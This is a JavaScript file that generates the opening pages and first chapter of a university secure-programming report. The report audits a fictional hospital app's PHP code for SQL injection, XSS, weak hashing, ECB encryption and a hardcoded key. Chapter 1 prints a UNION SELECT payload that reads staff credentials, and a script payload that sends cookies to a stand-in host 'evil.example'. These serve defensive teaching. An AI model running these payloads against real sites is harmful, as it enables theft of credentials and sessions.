const G = require("./gen");
const {
  h1, h2, h3, p, bold, italic, plain, bullet, figCaption, tblCaption,
  codeBlock, twoColCodeTable, dataTable, pageBreak,
  Document, Packer, Paragraph, TextRun, HeadingLevel, AlignmentType,
  Header, Footer, PageNumber, ExternalHyperlink, TableOfContents,
  STUDENT_NAME, MATRIC_NO, SECTION, LECTURER, GITHUB_URL, YOUTUBE_URL, FONT, SZ, LINE_SPACING,
} = G;

// =====================================================================
// FRONT PAGE
// =====================================================================
const frontPage = [
  new Paragraph({ spacing: { after: 100 }, alignment: AlignmentType.CENTER,
    children: [new TextRun({ text: "UNIVERSITI TEKNOLOGI MALAYSIA", font: FONT, size: 28, bold: true })] }),
  new Paragraph({ spacing: { after: 100 }, alignment: AlignmentType.CENTER,
    children: [new TextRun({ text: "FINAL EXAMINATION SEMESTER II, SESSION 2025/2026 (ALTERNATIVE ASSESSMENT)", font: FONT, size: 24, bold: true })] }),
  new Paragraph({ spacing: { after: 400 }, alignment: AlignmentType.CENTER,
    children: [new TextRun({ text: "SECR4483 / SCSR4483 — SECURE PROGRAMMING", font: FONT, size: 24, bold: true })] }),
  new Paragraph({ spacing: { after: 600 }, alignment: AlignmentType.CENTER,
    children: [new TextRun({
      text: "The HealthVault-API Supply Chain Compromise & Legacy Debt Architecture:\nForensic Audit, Secure Refactor, and Cryptographic Remediation of E-MedicVault",
      font: FONT, size: 30, bold: true,
    })] }),
  new Paragraph({ spacing: { after: 600 }, alignment: AlignmentType.CENTER,
    children: [new TextRun({ text: "Technical Documentation — Alternative Assessment", font: FONT, size: 24, italics: true })] }),
  new Paragraph({ spacing: { after: 150 }, alignment: AlignmentType.CENTER,
    children: [
      new TextRun({ text: "GitHub Repository: ", font: FONT, size: SZ, bold: true }),
      new ExternalHyperlink({ link: GITHUB_URL, children: [new TextRun({ text: GITHUB_URL, font: FONT, size: SZ, style: "Hyperlink" })] }),
    ] }),
  new Paragraph({ spacing: { after: 600 }, alignment: AlignmentType.CENTER,
    children: [
      new TextRun({ text: "YouTube (Unlisted) Presentation: ", font: FONT, size: SZ, bold: true }),
      new ExternalHyperlink({ link: YOUTUBE_URL, children: [new TextRun({ text: YOUTUBE_URL, font: FONT, size: SZ, style: "Hyperlink" })] }),
    ] }),
  new Paragraph({ spacing: { after: 100 }, alignment: AlignmentType.CENTER, children: [new TextRun({ text: `Name: ${STUDENT_NAME}`, font: FONT, size: SZ })] }),
  new Paragraph({ spacing: { after: 100 }, alignment: AlignmentType.CENTER, children: [new TextRun({ text: `Matric Number: ${MATRIC_NO}`, font: FONT, size: SZ })] }),
  new Paragraph({ spacing: { after: 100 }, alignment: AlignmentType.CENTER, children: [new TextRun({ text: `Section: ${SECTION}`, font: FONT, size: SZ })] }),
  new Paragraph({ spacing: { after: 100 }, alignment: AlignmentType.CENTER, children: [new TextRun({ text: `Lecturer: ${LECTURER}`, font: FONT, size: SZ })] }),
  new Paragraph({ spacing: { after: 600 }, alignment: AlignmentType.CENTER, children: [new TextRun({ text: "Course Code: SECR4483 / SCSR4483", font: FONT, size: SZ })] }),
  pageBreak(),
];

// =====================================================================
// TABLE OF CONTENTS
// =====================================================================
const tocPage = [
  h1("TABLE OF CONTENTS"),
  new TableOfContents("Table of Contents", { hyperlink: true, headingStyleRange: "1-3" }),
  pageBreak(),
];

// =====================================================================
// CHAPTER 1 — Architectural Code Review & Vulnerability Discourse
// =====================================================================
const ch1 = [
  h1("CHAPTER 1: ARCHITECTURAL CODE REVIEW & VULNERABILITY DISCOURSE"),

  h2("1.1 Introduction"),
  p("This chapter presents a forensic structural audit of the three source files implicated in the MediChain / E-MedicVault breach: search.php, auth.php, and crypto_vault.php. The objective is to identify the specific defects, explain the lower-level runtime mechanisms that let each defect execute successfully, and connect each defect to the fundamental secure coding principle it violated. The audit follows the file inventory supplied in the Appendix of the assessment brief and the schema.sql seed data used to reproduce the failure conditions locally."),

  h2("1.2 Vulnerability Inventory"),
  p("Table 1 summarises the seven hidden flaws distributed across the three files, each mapped to its Common Weakness Enumeration (CWE) classification."),
  tblCaption("Vulnerability inventory across the three breach-vector files"),
  dataTable(
    ["ID", "File", "Line(s)", "CWE", "Defect"],
    [
      ["A", "search.php", "9", "CWE-89", "SQL Injection via raw string concatenation into a mysqli query"],
      ["B", "search.php", "15-16", "CWE-79", "Reflected XSS — result rows echoed without output encoding"],
      ["C", "search.php", "20", "CWE-79", "Reflected XSS — error branch echoes raw keyword"],
      ["D", "auth.php", "9", "CWE-1284 / CWE-20", "Bound check uses byte-length (strlen) instead of character-length"],
      ["E", "auth.php", "14-15", "CWE-327 / CWE-916", "Credential verified against an unsalted MD5 digest"],
      ["F", "crypto_vault.php", "10", "CWE-327", "AES-128-ECB — non-semantically-secure block cipher mode"],
      ["G", "crypto_vault.php", "8", "CWE-798", "Hardcoded cryptographic key committed to source"],
    ],
    [8, 22, 12, 16, 42]
  ),

  h2("1.3 SQL Injection (Flaw A) — Runtime Mechanism"),
  p([bold("Root cause. "), plain("The legacy query is assembled by direct string concatenation:")]),
  codeBlock([`$sql = "SELECT id, name, illness_history FROM patient_records WHERE name LIKE '%" . $keyword . "%'";`, `$result = $conn->query($sql);`]),
  p("The mysqli::query() call hands the interpreter a single opaque string. PHP itself performs no SQL parsing; the string is transmitted verbatim to the MySQL server, where the SQL lexer tokenises it into keywords, identifiers, operators, and literals. Because $keyword is spliced into the string before this tokenisation occurs, there is no runtime boundary between what the developer intended as data (the search term) and what the interpreter treats as command grammar. A keyword such as x' UNION SELECT id, username, auth_key_hash FROM staff_credentials -- closes the opening quote early, so the MySQL lexer reads the injected UNION SELECT as a second, syntactically valid clause of the same statement rather than as literal text. The -- comment marker then discards the trailing %' fragment so the statement remains syntactically well-formed. Because the schema.sql connection is noted to run under high-privilege root access, the injected sub-query can read tables — such as staff_credentials — that the application logic never intended to expose through this endpoint."),
  p("Live proof-of-concept output, generated by demo/demo_sqli_vs_pdo.php against the exact vulnerable string-building logic, is reproduced in Figure 1."),
  codeBlock([
    "=== LEGACY: raw string concatenation (search.php, Hidden Flaw A) ===",
    "SELECT id, name, illness_history FROM patient_records WHERE name LIKE '%x' UNION",
    "SELECT id, username, auth_key_hash FROM staff_credentials -- %'",
    "-> The interpreter parses this as TWO UNIONed SELECT statements. The",
    "   attacker-supplied text became part of the SQL command grammar.",
  ]),
  figCaption("Terminal capture — legacy concatenation collapses data and command planes"),

  h2("1.4 Reflected XSS (Flaws B & C) — Runtime Mechanism"),
  p("Both flaws share one root cause: the response body is built by concatenating $keyword and database column values directly into an HTML string with no transformation:"),
  codeBlock([`echo "<div>Result found for keyword: " . $keyword . "<br>";`, `echo "No records found for: " . $keyword;`]),
  p("PHP's echo statement has no awareness of HTML syntax — it writes bytes to the response stream. The browser's HTML parser then re-interprets those bytes as markup. If $keyword contains <script>...</script>, the parser opens a new script execution context exactly as it would for any other <script> tag physically present in the page, because from the parser's perspective there is no distinction between developer-authored markup and reflected user input; both arrive in the same byte stream at the same trust level. Because the payload originates in the URL query string (?keyword=...) and is reflected back in the same response rather than stored, this is a reflected XSS: the attacker must lure a victim into clicking a crafted link, at which point the script executes in the victim's authenticated session against the hospital domain — enabling session-cookie theft, in-page phishing, or silent API calls performed with the victim's clearance."),
  figCaption("Terminal capture — script tag rendered verbatim vs. HTML-entity-encoded"),
  codeBlock([
    "=== LEGACY: context-agnostic echo (search.php, Hidden Flaws B & C) ===",
    'No records found for: <script>fetch("https://evil.example/steal?c="+document.cookie)</script>',
    "-> Sent verbatim to the browser: the <script> tag is parsed as an",
    "   executable element, not displayed as text.",
    "",
    "=== SECURE: context-aware output encoding (search.php refactor) ===",
    "No records found for: &lt;script&gt;fetch(&quot;https://evil.example/steal?c=&quot;+document.cookie)&lt;/script&gt;",
    "-> '<', '>', and quote characters are replaced with HTML entities.",
    "   The browser renders inert text; no script node is ever created.",
  ]),

  h2("1.5 Bound Constraint Failure — Byte vs. Character Mismatch (Flaw D)"),
  p("The legacy bound check is:"),
  codeBlock([`if (strlen($inputKey) > 256) { die("Fatal Error: Bound overflow detected."); }`]),
  p("PHP strings are byte sequences; strlen() returns the count of bytes, not the count of Unicode characters. Under UTF-8 — the connection charset declared in schema.sql (utf8mb4) — an ASCII character occupies 1 byte, but characters outside the Basic Latin range can occupy 2, 3, or 4 bytes. A payload composed of 4-byte UTF-8 sequences (e.g. emoji or certain CJK code points) reaches the 256-byte ceiling at only 64 semantic characters, meaning the check silently truncates or rejects legitimate short inputs; conversely, an attacker who understands this asymmetry can construct a string that is short in byte count but expands substantially once normalised, decoded, or re-encoded downstream (for example, if the value is later passed through a multi-byte-aware routine, logged, or used to build a fixed-size buffer that assumes one-byte-per-character). The comment embedded in the legacy file explicitly flags the resulting risk as high-concurrency memory exhaustion: because the boundary the developer intended (a 256-character human-readable key) and the boundary actually enforced (256 raw bytes) diverge under multi-byte input, downstream code that assumes the two are equivalent can allocate or process more logical data than the guard was designed to permit."),
  p([bold("Runtime demonstration. "), plain("mb_strlen($input, 'UTF-8') counts Unicode code points by walking the byte stream according to UTF-8's self-describing length-prefix bits, so a 256-character string built from 4-byte emoji reports 256 under mb_strlen() while reporting 1024 under strlen(). The test suite (tests/AuthServiceTest.php::testMultiByteInputIsBoundedByCharacterCountNotByteCount) asserts exactly this divergence and confirms the refactored bound accepts the emoji string precisely because it is evaluated on character count.")]),

  h2("1.6 Electronic Codebook (ECB) Pattern Leakage (Flaw F) — Runtime Mechanism"),
  p("AES is a block cipher: it transforms fixed-size 16-byte blocks under a key-dependent permutation. ECB mode applies that permutation independently to each block with no chaining input from prior blocks or any randomising initialisation vector: ciphertext_i = AES_encrypt(key, plaintext_i) for every block i in isolation. Consequently, whenever two plaintext blocks are byte-for-byte identical, ECB necessarily produces byte-for-byte identical ciphertext blocks, because the transformation is a deterministic, keyed permutation with no external state. An observer with no knowledge of the key can therefore detect structural repetition in the plaintext purely by comparing ciphertext blocks — precisely the seed data pattern in schema.sql, where two patient records begin with the identical clause 'DIAGNOSIS: Stage-2 Carcinoma.'. Figure 2 reproduces this leakage directly against the legacy cipher call in crypto_vault.php."),
  figCaption("Terminal capture — identical 16-byte plaintext blocks under AES-128-ECB yield identical ciphertext blocks"),
  codeBlock([
    "=== LEGACY: AES-128-ECB (crypto_vault.php, Hidden Flaw F) ===",
    "Plaintext block 1 == block 2: true",
    "Ciphertext block 1 (hex): 3d4ac7fb029cd158137eff97470619cf",
    "Ciphertext block 2 (hex): 3d4ac7fb029cd158137eff97470619cf",
    "Ciphertext blocks identical: TRUE (leak)  <-- pattern leakage",
  ]),
  p("An adversary in possession of the ciphertext database dump — obtained, in this case study, via the very SQL injection channel described in Section 1.3 — does not need to break AES to learn that two records share a diagnosis, a dosage line, or a treatment status; block-level equality in the ciphertext is a direct, unencrypted proxy for block-level equality in the plaintext. This is a chosen/known-plaintext-independent structural leak, not a brute-force weakness."),

  h2("1.7 Secure Coding Principles Violated & PDPA 2010 Nexus"),
  p("Table 2 maps each hidden flaw to the specific secure coding principle it violates and the corresponding provision of the Malaysian Personal Data Protection Act (PDPA) 2010 the resulting exposure implicates."),
  tblCaption("Secure coding principle violations and their PDPA 2010 nexus"),
  dataTable(
    ["Flaw", "Principle violated", "PDPA 2010 nexus"],
    [
      ["A (SQLi)", "Separation of Data and Command — user input was concatenated into, rather than bound outside of, the command grammar.", "Security Principle (s.9): a data user must take practical steps to protect personal data from loss, misuse, or unauthorised access. Root-privileged SQLi enabling bulk exfiltration is a direct failure of this duty."],
      ["B/C (XSS)", "Input Validation Boundaries — data crossing a trust boundary (client -> server -> browser) was never re-validated/encoded for its new execution context.", "Security Principle (s.9): session hijacking via reflected script execution exposes PII and clinical records without consent, and without adequate technical safeguards."],
      ["D (bound)", "Input Validation Boundaries — the boundary check measured the wrong unit (bytes vs. characters), producing a false sense of enforced limits.", "Security Principle (s.9) and Retention Principle (s.10) indirectly: uncontrolled resource consumption undermines system availability needed to fulfil data-subject rights and access controls."],
      ["E (MD5)", "Cryptographic Primitive Agility — the system was frozen on an obsolete, non-memory-hard primitive with no migration path or per-record salt.", "Security Principle (s.9): storing authentication secrets under a broken primitive is itself inadequate protection, independent of whether a breach has yet occurred."],
      ["F (ECB)", "Cryptographic Primitive Agility — encryption without semantic security or authentication provides only superficial confidentiality.", "Security Principle (s.9) and Notification obligations under the 2024 PDPA amendment: pattern-leaking 'encrypted' PII may still constitute an effective disclosure of relational structure between data subjects (e.g., shared diagnoses)."],
      ["G (hardcoded key)", "Separation of Configuration and Code / Secrets Management — a static secret was committed to version-controlled source rather than externalised.", "Security Principle (s.9): a key embedded in source is exposed to every party with repository access (including former staff, contractors, and any future public/leaked repository), multiplying the blast radius of the eventual breach."],
    ],
    [12, 40, 48]
  ),
  p("Collectively, these defects demonstrate why MediChain's executive decision to omit SAST and penetration testing under commercial time pressure is not a purely process failure: each hidden flaw corresponds to a distinct, well-documented, and independently detectable class of defect (OWASP Top 10 A03:2021-Injection, A03:2021 again for XSS, A04:2021-Insecure Design for the bound mismatch, and A02:2021-Cryptographic Failures for E, F, and G). A properly resourced SAST pass would very likely have flagged the raw string concatenation and openssl_encrypt() call with a static-mode argument as high-confidence findings prior to the Phase 2 deployment window."),

  h2("1.8 Chapter Summary"),
  p("This chapter established that all three source files fail at the same architectural level: each treats a trust boundary — SQL command vs. data, HTML markup vs. reflected text, semantic length vs. raw byte count, and confidential key material vs. ordinary source text — as if it did not exist. Chapter 2 now presents the structural refactor that reinstates each of these boundaries at the interpreter level, and Chapter 3 extends the same treatment to the cryptographic subsystem in crypto_vault.php."),
  pageBreak(),
];

module.exports = { frontPage, tocPage, ch1 };
